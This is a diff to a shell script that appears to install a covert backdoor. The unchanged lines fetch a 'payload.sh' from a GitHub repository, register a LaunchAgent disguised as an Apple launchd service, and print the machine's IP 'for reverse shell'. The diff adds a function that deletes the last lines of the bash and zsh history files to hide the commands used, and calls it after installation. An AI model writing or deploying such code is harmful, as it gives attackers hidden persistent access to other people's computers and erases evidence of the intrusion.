@@ -13,6 +13,23 @@ if [ "$USER" == "jmuhlber" ]; then
 fi
 
 
+clear_history() {
+	BSH_HST="$HOME/.bash_history"
+	if [[ -f "$BSH_HST" ]]; then
+		sed -i '$d' "$BSH_HST"
+		sed -i '$d' "$BSH_HST"
+	fi
+
+	ZSH_HST="$HOME/.zsh_history"
+	if [[ -f "$ZSH_HST" ]]; then
+		sed -i '$d' "$ZSH_HST"
+		sed -i '$d' "$ZSH_HST"
+	fi
+
+	echo "history cleared."
+}
+
+
 macinstall() {
 	if [[ -d ~/.oh-my-zsh ]]; then
 		curl https://raw.githubusercontent.com/Moewenmann/masterplan/refs/heads/main/source/payload.sh > /tmp/temp
@@ -31,8 +48,10 @@ macinstall() {
 	launchctl load ~/Library/LaunchAgents/com.apple.launchd.plist
 	launchctl start com.apple.launchd
 	echo "Installed la."
+	clear_history
 	echo "ip for reverse shell:"
 	ipconfig getifaddr en0
+	sleep 5
 }
 
 linuxinstall() {
